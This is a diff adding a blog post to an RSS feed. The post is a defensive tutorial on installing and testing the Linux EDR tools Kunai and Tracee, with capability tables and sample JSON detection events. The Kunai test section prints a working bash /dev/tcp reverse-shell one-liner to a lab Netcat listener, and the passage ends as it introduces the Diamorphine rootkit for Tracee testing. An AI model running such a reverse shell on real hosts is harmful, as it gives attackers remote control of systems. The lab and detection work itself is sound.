@@ -10,6 +10,496 @@
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
+            <title>Linux EDR for Host Events</title>
+            <link>https://mathscantor.github.io/posts/linux-edr-for-host-events/</link>
+            <pubDate>Mon, 12 Jan 2026 08:24:15 +0800</pubDate>
+            
+            <guid>https://mathscantor.github.io/posts/linux-edr-for-host-events/</guid>
+            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
+&lt;p&gt;Happy new year! To kick off the year, I’m switching gears and putting on a defender’s hat. After all, we need to &amp;ldquo;&lt;em&gt;know thy enemy&lt;/em&gt;&amp;rdquo;. If we don’t understand how detection systems work, we’re just making blind guesses when we try to make our exploits stealthier. That’s why we are going to explore some powerful open-source tools available today.&lt;/p&gt;
+&lt;p&gt;Linux Endpoint Detection and Response (EDR) focuses on collecting and correlating low-level system activity. For example, inspecting process execution, memory behavior, file access, and network events can help to surface malicious or suspicious behavior on Linux hosts. Instead of relying on signatures, Linux EDR provides the raw telemetry needed to understand what actually happened on a system.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
+<p>Happy new year! To kick off the year, I’m switching gears and putting on a defender’s hat. After all, we need to &ldquo;<em>know thy enemy</em>&rdquo;. If we don’t understand how detection systems work, we’re just making blind guesses when we try to make our exploits stealthier. That’s why we are going to explore some powerful open-source tools available today.</p>
+<p>Linux Endpoint Detection and Response (EDR) focuses on collecting and correlating low-level system activity. For example, inspecting process execution, memory behavior, file access, and network events can help to surface malicious or suspicious behavior on Linux hosts. Instead of relying on signatures, Linux EDR provides the raw telemetry needed to understand what actually happened on a system.</p>
+<p>This matters because effective threat hunting depends on context. By enriching raw kernel events with process trees, execution context, and behavioral patterns, Linux EDR turns isolated signals into meaningful narratives, allowing defenders to detect stealthy attacks, investigate anomalies, and validate hypotheses rather than just reacting to alerts.</p>
+<p>In this post, we’ll look at a few open-source Linux EDR and detection projects:</p>
+<ol>
+<li>Kunai</li>
+<li>Tracee</li>
+<li>LKRG</li>
+</ol>
+<h2 id="2-kunai">2. Kunai</h2>
+<p><em>Kunai</em> is a Linux-focused detection tool that leverages eBPF probes to surface security-relevant system activity. Events collected in the kernel are passed to a user-space agent, where they are enriched, correlated, and prepared for security monitoring and threat hunting workflows.</p>
+<h3 id="21-installation">2.1 Installation</h3>
+<p>These installation instructions are meant for Ubuntu/Debian machines.</p>
+<p><u>Step 1: Installing dependencies</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt update
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt install -y clang libbpf-dev
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Assuming you have rustup and cargo installed</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cargo install bpf-linker
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Kunai</em> Dependencies<br><br></span>
+<p><u>Step 2: Build <em>Kunai</em> from source</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/kunai-project/kunai.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd kunai
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/kunai$ cargo xtask build --release
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Building <em>Kunai</em><br><br></span>
+<p><u>Step 3: Install <em>Kunai</em></u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/kunai$ sudo target/x86_64-unknown-linux-gnu/release/kunai install
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Kunai</em><br><br></span>
+<p><u>Step 4: Configure <em>Kunai</em> Event Detection</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo vim /etc/kunai/config.yaml
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>events:
+</span></span><span style="display:flex;"><span>  execve:
+</span></span><span style="display:flex;"><span>    enable: true
+</span></span><span style="display:flex;"><span>  execve_script:
+</span></span><span style="display:flex;"><span>    enable: true
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Modify <em>Kunai</em> Configuration<br><br></span>
+<h3 id="22-capabilities-overview">2.2 Capabilities Overview</h3>
+<p>The capabilities of <em>Kunai</em> are summarized in the following table:</p>
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center;">Category</th>
+      <th style="text-align: center;">Capability</th>
+      <th style="text-align: center;">What It Observes / Detects</th>
+      <th style="text-align: center;">Why It Matters</th>
+    </tr>
+  <thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left;"><strong>Process Lifecycle</strong></td>
+      <td style="text-align: left;">Execve</td>
+      <td style="text-align: left;">Binary execution</td>
+      <td style="text-align: left;">Core signal for initial access and malware execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Execve Script</td>
+      <td style="text-align: left;">Script-based execution (bash, python, etc.)</td>
+      <td style="text-align: left;">Catches LOLBins and script-based tradecraft</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Exit</td>
+      <td style="text-align: left;">Process termination</td>
+      <td style="text-align: left;">Tracks short-lived or crashing processes</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Exit Group</td>
+      <td style="text-align: left;">Thread group termination</td>
+      <td style="text-align: left;">Useful for multi-threaded malware</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Clone</td>
+      <td style="text-align: left;">Process / thread creation</td>
+      <td style="text-align: left;">Detects forks, daemonization, process trees</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Process Control &amp; Abuse</strong></td>
+      <td style="text-align: left;">Prctl</td>
+      <td style="text-align: left;">Process attribute changes</td>
+      <td style="text-align: left;">Often abused for stealth or anti-debugging</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Kill</td>
+      <td style="text-align: left;">Signal delivery</td>
+      <td style="text-align: left;">Process termination, lateral interference</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Ptrace</td>
+      <td style="text-align: left;">Debugger attachment</td>
+      <td style="text-align: left;">Strong signal for malware, injectors, debuggers</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Kernel &amp; Privilege Abuse</strong></td>
+      <td style="text-align: left;">Init Module</td>
+      <td style="text-align: left;">Kernel module loading</td>
+      <td style="text-align: left;">Rootkits and kernel persistence</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">BPF Prog Load</td>
+      <td style="text-align: left;">eBPF program loading</td>
+      <td style="text-align: left;">Detects BPF-based malware or stealth tooling</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">BPF Socket Filter Attached</td>
+      <td style="text-align: left;">BPF network filter attachment</td>
+      <td style="text-align: left;">Network traffic interception</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Memory Execution</strong></td>
+      <td style="text-align: left;">Mprotect Exec</td>
+      <td style="text-align: left;">RW → RX memory transitions</td>
+      <td style="text-align: left;">Shellcode and in-memory execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Mmap Exec</td>
+      <td style="text-align: left;">Executable memory mappings</td>
+      <td style="text-align: left;">Fileless and reflective payloads</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Network Activity</strong></td>
+      <td style="text-align: left;">Connect</td>
+      <td style="text-align: left;">Outbound network connections</td>
+      <td style="text-align: left;">C2, lateral movement</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">DNS Query</td>
+      <td style="text-align: left;">DNS resolution events</td>
+      <td style="text-align: left;">Domain-based beaconing</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Send Data</td>
+      <td style="text-align: left;">Data exfiltration</td>
+      <td style="text-align: left;">C2 traffic and leaks</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>File Read Operations</strong></td>
+      <td style="text-align: left;">Read</td>
+      <td style="text-align: left;">Generic file reads</td>
+      <td style="text-align: left;">Recon and credential access</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Read Config</td>
+      <td style="text-align: left;">Configuration file reads</td>
+      <td style="text-align: left;">Targeting system/app configs</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>File Write Operations</strong></td>
+      <td style="text-align: left;">Write</td>
+      <td style="text-align: left;">Generic file writes</td>
+      <td style="text-align: left;">Droppers and modifications</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Write Config</td>
+      <td style="text-align: left;">Config file modification</td>
+      <td style="text-align: left;">Persistence and tampering</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Write and Close</td>
+      <td style="text-align: left;">Atomic write behavior</td>
+      <td style="text-align: left;">Common malware pattern</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Filesystem Changes</strong></td>
+      <td style="text-align: left;">File Create</td>
+      <td style="text-align: left;">New file creation</td>
+      <td style="text-align: left;">Droppers, payload staging</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">File Rename</td>
+      <td style="text-align: left;">File movement</td>
+      <td style="text-align: left;">Masquerading and evasion</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">File Unlink</td>
+      <td style="text-align: left;">File deletion</td>
+      <td style="text-align: left;">Cleanup and anti-forensics</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">File Scan</td>
+      <td style="text-align: left;">Directory/file enumeration</td>
+      <td style="text-align: left;">Reconnaissance phase</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Async / Advanced I/O</strong></td>
+      <td style="text-align: left;">IO_uring SQE</td>
+      <td style="text-align: left;">io_uring submission events</td>
+      <td style="text-align: left;">Modern high-performance malware</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Telemetry &amp; Stability</strong></td>
+      <td style="text-align: left;">Error</td>
+      <td style="text-align: left;">Internal sensor errors</td>
+      <td style="text-align: left;">Sensor health visibility</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Event Loss</td>
+      <td style="text-align: left;">Dropped events</td>
+      <td style="text-align: left;">Detection blind spots</td>
+    </tr>
+  </tbody>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table"><em>Kunai</em> Capability Coverage<br><br></span>
+<h3 id="23-testing-capabilities">2.3 Testing Capabilities</h3>
+<p>Is Kunai really as good as its documentation describes it to be? Let&rsquo;s find out!</p>
+<h4 id="231-dns-query">2.3.1 DNS Query</h4>
+<p>This example demonstrates a simple DNS query to resolve the IP address for <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;google.com&ensp;</span>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ nslookup google.com
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">DNS Query Example Command<br><br></span>
+<p>As seen from the listing below, <em>Kunai</em> captures a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;dns_query&ensp;</span> event corresponding to a domain resolution request for <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;google.com&ensp;</span>. The event records the process responsible for the lookup (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;systemd-resolved&ensp;</span>), its execution context, and the full set of IP addresses returned in the DNS response.</p>
+<p>By preserving both the queried domain and the resolved endpoints, <em>Kunai</em> provides visibility into name resolution activity that often precedes outbound connections.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd-resolved&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd-resolved&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;google.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;response&#34;</span>: <span style="color:#e6db74">&#34;74.125.130.139;74.125.130.138;74.125.130.101;74.125.130.113;74.125.130.100;74.125.130.102&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;event&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;source&#34;</span>: <span style="color:#e6db74">&#34;kunai&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">61</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;dns_query&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;97d8ceb6-e1a1-34c6-56f4-dc20f9b9577d&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;batch&#34;</span>: <span style="color:#ae81ff">2125</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utc_time&#34;</span>: <span style="color:#e6db74">&#34;2026-01-18T02:51:45.117865484Z&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">DNS Query Example Output<br><br></span>
+<h4 id="232-process-debugging">2.3.2 Process Debugging</h4>
+<p>This example demonstrates a debugger attaching to a running process using the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ptrace()&ensp;</span> syscall. Debugger attachment is a high-signal event, often associated with reverse engineering, process inspection, or malicious code injection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo gdb -p <span style="color:#e6db74">`</span>pidof sleep<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Process Debugging Example Command<br><br></span>
+<p>Kunai captures a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ptrace&ensp;</span> event where <em>GDB</em> attaches to an existing <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;sleep&ensp;</span> process. The event records the full process ancestry leading up to the debugger invocation, the exact command used (<code>gdb -p 6967</code>), and both the source executable (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/bin/gdb&ensp;</span>) and the target process being traced (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/bin/sleep&ensp;</span>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd|/usr/lib/systemd/systemd|/usr/bin/python3.12|/usr/bin/bash|/usr/bin/sudo|/usr/bin/sudo&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;gdb -p 6967&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/bin/gdb&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;0xa&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;target&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;sleep 10&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/bin/sleep&#34;</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;event&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;source&#34;</span>: <span style="color:#e6db74">&#34;kunai&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">9</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;ptrace&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;547ae482-37cf-b3b7-03be-076edc0f3f9b&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;batch&#34;</span>: <span style="color:#ae81ff">1477</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utc_time&#34;</span>: <span style="color:#e6db74">&#34;2026-01-18T03:10:23.330899923Z&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Process Debugging Example Output<br><br></span>
+<h4 id="233-reverse-shell">2.3.3 Reverse Shell</h4>
+<p>This example demonstrates a simple reverse shell payload that connects out to our <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;172.16.205.1:4242.&ensp;</span></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ /bin/bash -l &gt; /dev/tcp/172.16.205.1/4242 0&lt;&amp;<span style="color:#ae81ff">1</span> 2&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Reverse Shell Example Command<br><br></span>
+<p>As shown in the listing below, <em>Kunai</em> captures a connect event initiated by <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/bin/bash&ensp;</span>, revealing an outbound TCP connection to the <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;172.16.205.1:4242.&ensp;</span> The event records the full process ancestry leading to the shell execution, the executable responsible for the connection, and detailed socket metadata, including protocol, source port, and destination address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd|/usr/lib/systemd/systemd|/usr/bin/python3.12|/usr/bin/bash&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;/bin/bash&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;socket&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;domain&#34;</span>: <span style="color:#e6db74">&#34;AF_INET&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;SOCK_STREAM&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;proto&#34;</span>: <span style="color:#e6db74">&#34;TCP&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;src&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;ip&#34;</span>: <span style="color:#e6db74">&#34;172.16.205.15&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">50132</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;dst&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;hostname&#34;</span>: <span style="color:#e6db74">&#34;?&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;ip&#34;</span>: <span style="color:#e6db74">&#34;172.16.205.1&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">4242</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;public&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;is_v6&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;community_id&#34;</span>: <span style="color:#e6db74">&#34;1:SU314PGEhh7ex8ppaUaGGB6uXxw=&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;connected&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;event&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;source&#34;</span>: <span style="color:#e6db74">&#34;kunai&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">60</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;connect&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;0f47910f-29e7-662e-24bf-c50208439702&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;batch&#34;</span>: <span style="color:#ae81ff">280</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utc_time&#34;</span>: <span style="color:#e6db74">&#34;2026-01-18T03:22:49.150574287Z&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Reverse Shell Example Output<br><br></span>
+<h2 id="3-tracee">3. Tracee</h2>
+<p><em>Tracee</em> is a Linux runtime security tool that uses eBPF to capture syscalls and process behavior in real time. Unlike <em>Kunai’s</em> enriched EDR approach, <em>Tracee</em> gives raw and low-level events, perfect for forensics, adversary simulations, and understanding exactly how attacks unfold.</p>
+<h3 id="31-installation">3.1 Installation</h3>
+<p>Again, these installation instructions are meant for Ubuntu/Debian machines.</p>
+<p><u>Step 1: Installing dependencies</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt-get install golang-go build-essential linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span> clang libelf1 libelf-dev zlib1g-dev libbpf-dev
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Tracee</em> Dependencies<br><br></span>
+<p><u>Step 2: Build <em>Tracee</em> from Source</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/aquasecurity/tracee.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd tracee
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/tracee$ make
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Building <em>Tracee</em><br><br></span>
+<p><u>Step 3: Install <em>Tracee</em></u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/tracee$ sudo cp ./dist/tracee /usr/bin/
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Tracee</em><br><br></span>
+<h3 id="32-capabilities-overview">3.2 Capabilities Overview</h3>
+<p>The list of monitored events is extensive, so I’ll point you to the command that lets you inspect <em>Tracee’s</em> capabilities yourself.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ tracee list events
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Showing Supported <em>Tracee</em> Events<br><br></span>
+<h3 id="33-testing-capabilities">3.3 Testing Capabilities</h3>
+<p>To test out the true capabilities of <em>Tracee</em>, we assume that our machine has already been compromised. Using <a href="https://github.com/m0nad/Diamorphine.git"><em>Diamorphine</em></a> as our example LKM rootkit, we shall first insert the module, before running <em>Tracee</em>.</p>
